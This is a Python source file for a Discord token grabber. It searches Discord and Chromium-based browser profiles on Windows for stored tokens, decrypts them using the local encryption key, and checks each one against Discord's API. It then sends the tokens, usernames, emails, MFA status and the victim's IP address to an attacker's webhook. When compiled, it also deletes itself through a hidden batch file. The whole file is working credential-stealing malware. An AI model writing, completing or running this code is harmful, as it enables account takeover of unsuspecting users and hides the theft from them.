import os, sys, json, base64, re, subprocess, ctypes
from datetime import datetime
import requests
from Crypto.Cipher import AES
import win32crypt

WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"  # <-- CHANGE THIS

if os.name != "nt":
    sys.exit(0)

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

def send_webhook(content, file=None):
    try:
        if file:
            with open(file, "rb") as f:
                requests.post(WEBHOOK, files={"file": f})
        else:
            requests.post(WEBHOOK, json={"content": content})
    except Exception as e:
        print(f"Webhook error: {e}")

def getkey(path):
    try:
        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
            return json.load(f)['os_crypt']['encrypted_key']
    except:
        return None

def gettokens(path):
    tokens = []
    ldb_path = path + "\\Local Storage\\leveldb\\"
    if not os.path.exists(ldb_path):
        return tokens
    for file in os.listdir(ldb_path):
        if not file.endswith((".ldb", ".log")):
            continue
        try:
            with open(f"{ldb_path}{file}", "r", errors="ignore") as f:
                content = f.read()
                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
                    tokens.append(match)
        except:
            continue
    return tokens

def decrypt_token(encrypted_token, key):
    try:
        encrypted = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
        decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, encrypted[3:15])
        return cipher.decrypt(encrypted[15:])[:-16].decode()
    except:
        return None

def getip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "unknown")
    except:
        return "unknown"

def main():
    print("Starting Discord token grabber...")
    send_webhook(content="**Token grabber started**")
    checked = []
    results = {"ip": getip(), "user": os.getenv("USERNAME", "unknown"), "tokens": []}

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            print(f"Skipping {platform}: path not found")
            continue

        key = getkey(path)
        if not key:
            print(f"Skipping {platform}: no key found")
            continue

        print(f"Searching {platform}...")
        for token in gettokens(path):
            token = token.rstrip("\\")
            decrypted = decrypt_token(token, key)
            if not decrypted or decrypted in checked:
                continue
            checked.append(decrypted)
            try:
                user_req = requests.get('https://discord.com/api/v10/users/@me', headers={"Authorization": decrypted})
                if user_req.status_code == 200:
                    user = user_req.json()
                    results["tokens"].append({
                        "token": decrypted,
                        "username": user.get("username", "unknown"),
                        "userid": user.get("id", "unknown"),
                        "email": user.get("email", "none"),
                        "source": platform,
                        "verified": user.get("verified", False),
                        "mfa": user.get("mfa_enabled", False)
                    })
                    print(f"Found token for {user.get('username')}")
            except:
                continue

    if results["tokens"]:
        send_webhook(content=f"```json\n{json.dumps(results, indent=2)}\n```")
        print(f"Sent {len(results['tokens'])} tokens to webhook")
    else:
        send_webhook(content="No Discord tokens found on this PC.")
        print("No tokens found")

    # Optional: clean up (self-delete if compiled)
    try:
        if hasattr(sys, 'frozen'):
            exe_path = sys.executable
            bat_path = os.path.join(TEMP, 'clean.bat')
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

    print("Done.")

if __name__ == "__main__":
    main()
